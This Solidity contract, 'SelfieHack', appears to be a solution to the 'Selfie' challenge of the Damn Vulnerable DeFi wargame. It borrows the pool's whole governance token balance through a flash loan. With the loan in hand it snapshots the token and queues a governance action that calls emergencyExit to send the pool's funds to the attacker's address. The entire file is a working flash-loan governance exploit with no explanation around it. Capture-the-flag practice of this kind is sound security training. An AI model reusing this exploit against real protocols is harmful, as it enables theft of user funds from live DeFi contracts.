// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./SelfiePool.sol";

contract SelfieHack {
    SelfiePool selfiePool;
    SimpleGovernance gov;
    DamnValuableTokenSnapshot token;
    address owner;

    constructor(SelfiePool selfiePool_, SimpleGovernance gov_) {
        selfiePool = selfiePool_;
        gov = gov_;
        token = DamnValuableTokenSnapshot(gov.getGovernanceToken());
        owner = msg.sender;
    }

    function attack() external {
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), token.balanceOf(address(selfiePool)), "");
    }

    function onFlashLoan(address initiator, address, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32) {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", address(owner));
        token.snapshot();
        gov.queueAction(address(selfiePool), 0, data);
        IERC20(token).approve(address(selfiePool), type(uint).max);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}